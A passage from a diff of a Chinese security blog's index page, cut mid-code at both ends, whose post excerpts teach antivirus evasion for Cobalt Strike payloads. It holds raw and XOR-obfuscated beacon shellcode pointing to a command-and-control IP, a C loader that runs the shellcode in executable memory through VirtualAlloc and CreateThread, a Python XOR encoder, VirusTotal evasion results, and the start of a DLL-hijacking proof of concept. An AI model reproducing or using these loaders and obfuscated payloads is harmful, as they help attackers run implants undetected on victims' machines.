e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x37\x30\x2e\x31\x32\x38\x00\x00\x00\x00\x00</span><span class="s">"</span><span class="p">;</span>
+
+<span class="c1">// 获取shellcode大小</span>
+<span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+<span class="cm">/*
+VirtualAlloc(
+    NULL, // 基址
+    800,  // 大小
+    MEM_COMMIT, // 内存页状态
+    PAGE_EXECUTE_READWRITE // 可读可写可执行
+    );
+*/</span>
+
+<span class="kt">char</span> <span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span>
+    <span class="nb">NULL</span><span class="p">,</span>
+    <span class="n">shellcode_size</span><span class="p">,</span>
+    <span class="n">MEM_COMMIT</span><span class="p">,</span>
+    <span class="n">PAGE_EXECUTE_READWRITE</span>
+    <span class="p">);</span>
+    <span class="c1">// 将shellcode复制到可执行的内存页中</span>
+<span class="n">CopyMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">shellcode_size</span><span class="p">);</span>
+
+<span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+    <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+    <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+    <span class="p">);</span>
+
+<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="n">INFINITE</span><span class="p">);</span> <span class="c1">// 一直等待线程执行结束</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>编译成功后，运行：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ae3c7c2523b769b9daf73290eba00e9d.png" alt="2019-11-10-02-02-56" /></p>
+
+<p>V站查杀结果：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9ae0b7ce7224d81bcb3faa012e97b3b2.png" alt="2019-11-10-02-03-07" /></p>
+
+<p>https://www.virustotal.com/gui/file/00b0fe741923838b5757281e2ea37c0732c88443a8a4730f384371d8a8b0c2b0/detection</p>
+
+<p>这个效果已经很好，但是我想要更好。</p>
+
+<h2 id="0x04-实现一次混淆加载">0x04 实现一次混淆加载</h2>
+
+<p>使用之前的Python脚本混淆生成RAW文件，最后得到混淆后的数组：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+</span>
+
+<span class="c1">// 入口函数</span>
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+
+    <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// shellcode长度</span>
+    <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span> <span class="c1">// 线程ID</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span> <span class="c1">// 线程句柄</span>
+<span class="cm">/* length: 800 bytes */</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a</span><span class="s">"</span><span class="p">;</span>
+
+
+<span class="c1">// 获取shellcode大小</span>
+<span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+<span class="cm">/* 增加异或代码 */</span>
+<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">shellcode_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mi">10</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cm">/*
+VirtualAlloc(
+    NULL, // 基址
+    800,  // 大小
+    MEM_COMMIT, // 内存页状态
+    PAGE_EXECUTE_READWRITE // 可读可写可执行
+    );
+*/</span>
+
+<span class="kt">char</span> <span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span>
+    <span class="nb">NULL</span><span class="p">,</span>
+    <span class="n">shellcode_size</span><span class="p">,</span>
+    <span class="n">MEM_COMMIT</span><span class="p">,</span>
+    <span class="n">PAGE_EXECUTE_READWRITE</span>
+    <span class="p">);</span>
+    <span class="c1">// 将shellcode复制到可执行的内存页中</span>
+<span class="n">CopyMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">shellcode_size</span><span class="p">);</span>
+
+<span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+    <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+    <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+    <span class="p">);</span>
+
+<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="n">INFINITE</span><span class="p">);</span> <span class="c1">// 一直等待线程执行结束</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>上线效果：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/84bf754d1afd227d93498e3f430869e1.png" alt="2019-11-10-02-03-50" /></p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/94ab9484b62fef4f84b36dd0671a8b21.png" alt="2019-11-10-02-03-57" /></p>
+
+<p>V站查杀：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/55b2a8ab680d466d52d20b40011fe9f4.png" alt="2019-11-10-02-04-08" /></p>
+
+<p>https://www.virustotal.com/gui/file/a12105a78ccc3228bae12c170782c71b8212bd44e65f519947c6136f17e04723/detection</p>
+
+-->
+          来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。
+          <p>
+            <a class="post-link" href="/archivers/2019-11-10/2">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2019-11-10/1">静态恶意代码逃逸（第一课）</a>
+        </h2>
+        
+        <div class="post-meta">Nov 10, 2019</div>
+
+        <div class="post-excerpt">
+          <!--<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode</p>
+
+<p>在此之前，我分享过《高级后渗透C2免杀与对抗》，其中对于一些原理铺垫上稍有欠缺，因此准备分成几篇文章来展开。</p>
+
+<h2 id="0x01-恶意代码的定义">0X01 恶意代码的定义</h2>
+
+<p>以下文章中的所有关于恶意代码的定义都以Cobaltstrike的载荷为例。</p>
+
+<h2 id="0x02-shellcode定义">0x02 Shellcode定义</h2>
+
+<p>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。</p>
+
+<h2 id="0x03-raw文件">0x03 RAW文件</h2>
+<p>RAW 中文意思是原始的、未经加工的，通常使用Cobaltstrike生成的BIN文件。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c92e631bce3ba5a65abf23ba121a2dbd.png" alt="2019-11-10-01-55-50" /></p>
+
+<p>RAW文件是可以直接进行字节操作读取的，因此加载到内存较为方便，通常我一般使用混淆的方式再生成一遍。</p>
+
+<h2 id="0x04-c文件">0x04 C文件</h2>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0e4a46bbd3c992df26cccad1a51b4c28.png" alt="2019-11-10-01-56-09" /></p>
+
+<p>C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的。</p>
+
+<h2 id="0x05-组合">0x05 组合</h2>
+
+<p>由于反病毒软件对于默认生成的文件查杀较为严格，我通常会采用混淆、加密解密的方式把载荷还原。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">argparse</span> <span class="kn">import</span> <span class="n">ArgumentParser</span><span class="p">,</span> <span class="n">FileType</span>
+
+<span class="k">def</span> <span class="nf">process_bin</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">src_fp</span><span class="p">,</span> <span class="n">dst_fp</span><span class="p">,</span> <span class="n">dst_raw</span><span class="p">):</span>
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="n">shellcode_size</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">shellcode_raw</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">code</span> <span class="o">=</span> <span class="n">src_fp</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">code</span><span class="p">:</span>
+                <span class="k">break</span>
+
+            <span class="n">base10</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">^</span> <span class="n">num</span>
+            <span class="n">base10_str</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">base10</span><span class="p">)</span>
+            <span class="n">shellcode_raw</span> <span class="o">+=</span> <span class="n">base10_str</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+            <span class="n">code_hex</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base10</span><span class="p">)</span>
+            <span class="n">code_hex</span> <span class="o">=</span> <span class="n">code_hex</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'0x'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
+            <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">code_hex</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span>
+                <span class="n">code_hex</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">+</span> <span class="n">code_hex</span>
+            <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x'</span> <span class="o">+</span> <span class="n">code_hex</span>
+            <span class="n">shellcode_size</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">src_fp</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">dst_raw</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode_raw</span><span class="p">)</span>
+        <span class="n">dst_raw</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">dst_fp</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+        <span class="n">dst_fp</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">shellcode_size</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">.</span><span class="n">writelines</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s">'Shellcode X'</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s">'[XOR The Cobaltstrike PAYLOAD.BINs] </span><span class="se">\t</span><span class="s"> &gt; Author: rvn0xsy@gmail.com'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-v'</span><span class="p">,</span><span class="s">'--version'</span><span class="p">,</span><span class="n">nargs</span><span class="o">=</span><span class="s">'?'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-s'</span><span class="p">,</span><span class="s">'--src'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sa">u</span><span class="s">'source bin file'</span><span class="p">,</span><span class="nb">type</span><span class="o">=</span><span class="n">FileType</span><span class="p">(</span><span class="s">'rb'</span><span class="p">),</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span><span class="s">'--dst'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sa">u</span><span class="s">'destination shellcode file'</span><span class="p">,</span><span class="nb">type</span><span class="o">=</span><span class="n">FileType</span><span class="p">(</span><span class="s">'w+'</span><span class="p">),</span><span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-n'</span><span class="p">,</span><span class="s">'--num'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sa">u</span><span class="s">'Confused number'</span><span class="p">,</span><span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">90</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-r'</span><span class="p">,</span><span class="s">'--raw'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sa">u</span><span class="s">'output bin file'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="n">FileType</span><span class="p">(</span><span class="s">'wb'</span><span class="p">),</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">shellcode_size</span> <span class="o">=</span> <span class="n">process_bin</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">num</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">src</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">dst</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">raw</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">writelines</span><span class="p">(</span><span class="s">"[+]Shellcode Size : {} </span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">shellcode_size</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>上面这个脚本是我在去年写的，用于把raw文件混淆，生成c语言数组，在后面的文章中，我们也以c/c++语言为主，探究其本质。</p>
+
+<h3 id="混淆方案">混淆方案</h3>
+
+<p>先生成bin文件，然后运行python脚本：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10
+</code></pre></div></div>
+
+<p>在payload.c中会看到raw文件里的每一个字节与10的异或运算出的C语言数组。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8f85073149fe77ff6bc0040a50f2e3d4.png" alt="2019-11-10-01-57-13" /></p>
+
+<p>这个数组的内容，将由下一篇文章用到，实践一下Shellcode混淆免杀。</p>
+-->
+          <!---->
+          来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。
+          <p>
+            <a class="post-link" href="/archivers/2019-11-10/1">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2019-10-02/1">DllMain与rundll32详解</a>
+        </h2>
+        
+        <div class="post-meta">Oct 2, 2019</div>
+
+        <div class="post-excerpt">
+          <!--<h2 id="0x00-dllmain">0x00 DllMain</h2>
+
+<p>对于动态链接库，DllMain是一个<strong>可选的</strong>入口函数。</p>
+
+<h3 id="程序调用dll中的导出函数的流程">程序调用DLL中的导出函数的流程</h3>
+
+<ul>
+  <li>程序调用Windows API <code class="language-plaintext highlighter-rouge">LoadLibrary</code></li>
+  <li>操作系统寻找LoadLibrary所加载的DLL文件</li>
+  <li>操作系统将DLL文件加载至目标程序进程的内存空间</li>
+  <li>程序自动调用<code class="language-plaintext highlighter-rouge">DllMain</code>函数</li>
+  <li>程序调用DLL中导出函数</li>
+</ul>
+
+<p><strong>如果DLL被多次<code class="language-plaintext highlighter-rouge">LoadLibrary</code>，那么<code class="language-plaintext highlighter-rouge">DllMain</code>只执行一次，引用基数+1。</strong></p>
+
+<h3 id="dllmain的原型">DllMain的原型</h3>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span>
+  <span class="n">_In_</span> <span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="c1">// 指向自身的句柄</span>
+  <span class="n">_In_</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="c1">// 调用原因</span>
+  <span class="n">_In_</span> <span class="n">LPVOID</span> <span class="n">lpvReserved</span> <span class="c1">// 隐式加载和显式加载</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="0x01-dllmain调用原因">0x01 DllMain调用原因</h2>
+
+<p>其中<code class="language-plaintext highlighter-rouge">fdwReason</code>用来表示Dll被调用的状态，一共分为四种：</p>
+
+<ul>
+  <li>DLL_PROCESS_ATTACH 被进程加载</li>
+  <li>DLL_PROCESS_DETACH 被进程释放</li>
+  <li>DLL_THREAD_ATTACH  被线程加载</li>
+  <li>DLL_THREAD_DETACH  被线程释放</li>
+</ul>
+
+<p>在DllMain中通常为了捕获DLL被调用的方式来进行某些动作：</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HANDLE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="err">　</span><span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
+<span class="err">　</span><span class="p">{</span>
+<span class="err">　　</span><span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+<span class="err">　　　</span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">process attach of dll"</span><span class="p">);</span>
+<span class="err">　　　</span><span class="k">break</span><span class="p">;</span>
+<span class="err">　　</span><span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
+<span class="err">　　　</span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">thread attach of dll"</span><span class="p">);</span>
+<span class="err">　　　</span><span class="k">break</span><span class="p">;</span>
+<span class="err">　　</span><span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
+<span class="err">　　　</span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">thread detach of dll"</span><span class="p">);</span>
+<span class="err">　　　</span><span class="k">break</span><span class="p">;</span>
+<span class="err">　　</span><span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
+<span class="err">　　　</span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">process detach of dll"</span><span class="p">);</span>
+<span class="err">　　　</span><span class="k">break</span><span class="p">;</span>
+<span class="err">　</span><span class="p">}</span>
+<span class="err">　</span><span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="0x02-那些用于测试dll劫持的dllmain-poc">0x02 那些用于测试DLL劫持的DllMain POC</h2>
+
+<ul>
+  <li>https://cxsecurity.com/issue/WLB-2018090232</li>
+  <li>https://cxsecurity.com/issue/WLB-2015010114</li>
+</ul>
+
+<p>在测试很多DLL劫持的漏洞时，都喜欢用DllMain，是因为DllMain被进程加载或者释放都会自动调用运行。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
+</span>
+<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span>
+            <span class="n">HANDLE</span>    <span class="n">hinstDLL</span><span class="p">,</span>
+            <span class="n">DWORD</span>     <span class="n">fdwReason</span><span class="p">,</span>
+            <span class="n">LPVOID</span>    <span class="n">lpvReserved</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">fdwReason</span><span class="p">)</span>
+  <span class="p">{</span>
+  <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+    <span class="n">owned</span><span class="p">();</span>
